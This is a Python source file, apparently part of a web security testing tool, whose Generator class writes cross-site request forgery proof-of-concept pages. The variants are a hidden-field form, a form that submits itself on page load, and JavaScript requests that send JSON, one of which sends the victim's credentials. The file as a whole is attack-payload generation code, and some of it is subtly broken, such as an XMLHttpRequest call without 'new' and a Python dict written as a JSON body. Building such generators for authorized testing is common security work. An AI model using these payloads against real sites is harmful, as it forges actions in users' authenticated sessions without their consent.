
# GENERATE PAYLOADS AND PARSE INFO

class Generator():

    def __init__(self:object,action:str,method:str,name:list):
        self.__action = action
        self.__method = method
        self.__name = name
    
    def CsrfUserInteraction(self:object):
        dicionario = {}
        for name in self.__name:
            dicionario[name] = f"\t<input name=\"{name}\" value=\"__valor__\" type=\"hidden\"/>\r\n"

        lista = ["<!DOCTYPE html>\r\n",
            "<html lang=\"pt-br\">\r\n",
            "<body>\r\n",
            f"\t<form action=\"{self.__action}\" method=\"{self.__method}\">\r\n",
            "\t</form>\r\n"
            "</body>\r\n"]

        with open("./csrf.html","a") as arquivo:
            for tag in lista:
                arquivo.write(tag)
                if "method" in tag:
                    for input in dicionario:
                        arquivo.write(dicionario[input])
                    arquivo.write("\t<input type=\"submit\">Enviar</input>\r\n")
            arquivo.write("</html>\r\n")

    def CsrfNoUserInteraction(self:object):
        dicionario = {}
        for name in self.__name:
            dicionario[name] = f"\t<input name=\"{name}\" value=\"__valor__\" type=\"hidden\"/>\r\n"

        lista = ["<!DOCTYPE html>\r\n",
            "<html lang=\"pt-br\">\r\n",
            "<body>\r\n",
            f"\t<form action=\"{self.__action}\" method=\"{self.__method}\">\r\n",
            "\t</form>\r\n"
            "</body>\r\n"]

        with open("./csrf_nouser.html","a") as arquivo:
            for tag in lista:
                arquivo.write(tag)
                if "method" in tag:
                    for input in dicionario:
                        arquivo.write(dicionario[input])
                    arquivo.write("\t<script> document.forms[0].submit();</script>\r\n")
            arquivo.write("</html>\r\n")

    def CsrfJson(self:object):
        dicionario = {}
        for name in self.__name:
            dicionario[name] = "__valor__"
        
        lista = ["<!DOCTYPE html>\r\n",
            "<html lang=\"pt-br\">\r\n",
            "<body>\r\n",
            "\t<script>\r\n",
            "\tvar csrf = XMLHttpRequest();\r\n",
            f"\tcsrf.open(\"{self.__method}\",\"{self.__action}\");\r\n",
            "\tcsrf.setRequestHeader(\"Content-Type\",\"application/json\");\r\n"
            ]

        with open("./csrfjson.html","a") as arquivo:
            for tag in lista:
                arquivo.write(tag)
                if "setRequestHeader" in tag:
                    arquivo.write(f"\tcsrf.send({dicionario});\r\n")
                    arquivo.write(f"\t</script>\r\n")
                    arquivo.write(f"</body>\r\n")
                    arquivo.write(f"</html>")

    def CsrfJsonCredentials(self:object):
        dicionario = {}
        for name in self.__name:
            dicionario[name] = "__valor__"
        
        lista = ["<!DOCTYPE html>\r\n",
            "<html lang=\"pt-br\">\r\n",
            "<body>\r\n",
            "\t<script>\r\n",
            "\tvar csrf = XMLHttpRequest();\r\n",
            f"\tcsrf.open(\"{self.__method}\",\"{self.__action}\");\r\n",
            "\tcsrf.setRequestHeader(\"Content-Type\",\"application/json\");\r\n",
            "\tcsrf.withCredentials = true;\r\n"
            ]

        with open("./csrfjson.html","a") as arquivo:
            for tag in lista:
                arquivo.write(tag)
                if "withCredentials" in tag:
                    arquivo.write(f"\tcsrf.send({dicionario});\r\n")
                    arquivo.write(f"\t</script>\r\n")
                    arquivo.write(f"</body>\r\n")
                    arquivo.write(f"</html>")